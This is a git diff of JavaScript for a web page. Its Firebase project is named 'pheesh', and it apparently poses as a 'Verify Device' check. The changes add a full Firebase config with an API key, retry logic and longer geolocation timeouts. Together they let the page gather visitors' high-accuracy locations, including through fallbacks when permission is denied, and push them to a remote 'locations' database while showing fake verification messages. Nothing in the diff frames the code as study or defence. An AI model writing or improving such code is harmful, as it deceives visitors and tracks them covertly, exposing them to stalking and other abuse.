@@ -1,39 +1,49 @@
-// Initialize Firebase with minimal config
+// Initialize Firebase with full config
 const firebaseConfig = {
-    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app"
+    apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
+    authDomain: "pheesh-4481e.firebaseapp.com",
+    databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app",
+    projectId: "pheesh-4481e",
+    storageBucket: "pheesh-4481e.appspot.com",
+    messagingSenderId: "458791455321",
+    appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e"
 };
 
 // Initialize Firebase
 let database;
-try {
-    firebase.initializeApp(firebaseConfig);
-    console.log('Firebase initialized successfully');
-    database = firebase.database();
-    console.log('Database reference created');
+const initFirebase = () => {
+    return new Promise((resolve, reject) => {
+        try {
+            if (!firebase.apps.length) {
+                firebase.initializeApp(firebaseConfig);
+            }
+            database = firebase.database();
+            console.log('Firebase initialized successfully');
+            
+            // Test database connection
+            database.ref('.info/connected').on('value', (snapshot) => {
+                const isConnected = snapshot.val();
+                console.log('Database connection state:', isConnected);
+                if (!isConnected && document.visibilityState !== 'hidden') {
+                    console.warn('Attempting to reconnect to Firebase...');
+                    database.goOnline();
+                }
+            });
 
-    // Test database connection
-    database.ref('.info/connected').on('value', (snapshot) => {
-        const isConnected = snapshot.val();
-        console.log('Database connection state:', isConnected);
-        if (!isConnected && document.visibilityState !== 'hidden') {
-            console.warn('Attempting to connect to Firebase database...');
+            // Test write permission
+            database.ref('test-write').set({
+                timestamp: firebase.database.ServerValue.TIMESTAMP
+            }).then(() => {
+                console.log('Write permission verified');
+                database.ref('test-write').remove();
+                resolve(database);
+            }).catch(reject);
+        } catch (error) {
+            console.error('Firebase initialization error:', error);
+            reject(error);
         }
     });
-
-    // Test write permission
-    const testRef = database.ref('test-write');
-    testRef.set({
-        timestamp: firebase.database.ServerValue.TIMESTAMP
-    }).then(() => {
-        console.log('Write permission verified');
-        testRef.remove(); // Clean up test data
-    }).catch(error => {
-        console.error('Write permission test failed:', error);
-    });
-
-} catch (error) {
-    console.error('Error initializing Firebase:', error);
-}
+};
 
 // Initialize theme handling
 let currentTheme = '';
@@ -140,24 +150,35 @@ async function determineLocationSource(position) {
     return 'Cell/IP';
 }
 
-async function saveFallbackLocation(locationData) {
+async function saveFallbackLocation(locationData, button, status) {
     if (!database) {
-        console.error('Database not initialized');
-        locationStatus.textContent = 'Verification error. Please try again.';
-        return;
+        try {
+            await initFirebase();
+        } catch (error) {
+            console.error('Failed to initialize database:', error);
+            status.textContent = 'Verification error. Please try again.';
+            return;
+        }
     }
 
+    // Clean undefined values
+    const cleanData = JSON.parse(JSON.stringify(locationData));
+    
     try {
         const newLocationRef = database.ref('locations').push();
-        await newLocationRef.set(locationData);
-        console.log('Fallback location saved successfully to Firebase with key:', newLocationRef.key);
-        locationStatus.textContent = 'Processing verification...';
+        await newLocationRef.set(cleanData);
+        console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
+        status.textContent = 'Processing verification...';
+        return true;
     } catch (dbError) {
         console.error('Error saving location to Firebase:', dbError);
-        locationStatus.textContent = 'Verification error. Please try again.';
-        allowLocationButton.disabled = false;
-        allowLocationButton.textContent = 'Verify Device';
-        allowLocationButton.classList.remove('loading');
+        status.textContent = 'Verification error. Please try again.';
+        if (button) {
+            button.disabled = false;
+            button.textContent = 'Verify Device';
+            button.classList.remove('loading');
+        }
+        return false;
     }
 }
 
@@ -182,12 +203,13 @@ document.addEventListener('DOMContentLoaded', () => {
 
         const geoOptions = {
             enableHighAccuracy: true,
-            timeout: 15000, // Increased timeout for slower mobile connections
-            maximumAge: 30000 // Allow slightly cached positions for better response
+            timeout: 30000, // Further increased timeout for mobile connections
+            maximumAge: 60000, // Increased cache time for better response
+            maximumWait: 35000 // Maximum time to wait for high accuracy
         };
 
         try {
-            // Chrome/Android specific handling
+            // Enhanced Chrome/Android handling
             const isChromeAndroid = /Chrome/.test(navigator.userAgent) && /Android/.test(navigator.userAgent);
             const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
             
@@ -198,18 +220,23 @@ document.addEventListener('DOMContentLoaded', () => {
                     
                     if (permissionResult.state === 'denied') {
                         console.log('Geolocation permission denied in Chrome');
-                        await handleLocationFallback();
+                        await handleLocationFallback(null, allowLocationButton, locationStatus);
                         return;
                     }
                     
-                    // For Android Chrome, we need to handle 'prompt' state
-                    if (isChromeAndroid && permissionResult.state === 'prompt') {
-                        console.log('Chrome Android requires explicit permission');
-                        // We'll continue to getCurrentPosition which will show the prompt
+                    if (isChromeAndroid) {
+                        console.log('Chrome Android detected');
+                        if (permissionResult.state === 'prompt') {
+                            console.log('Chrome Android requires explicit permission');
+                            // Show a message to the user
+                            locationStatus.textContent = 'Please allow location access when prompted...';
+                        }
+                        // Increase timeout for Android
+                        geoOptions.timeout = 45000;
                     }
                 } catch (error) {
                     console.error('Error checking permissions:', error);
-                    // Continue anyway as permission API might not be available
+                    // Continue with default options
                 }
             }
 
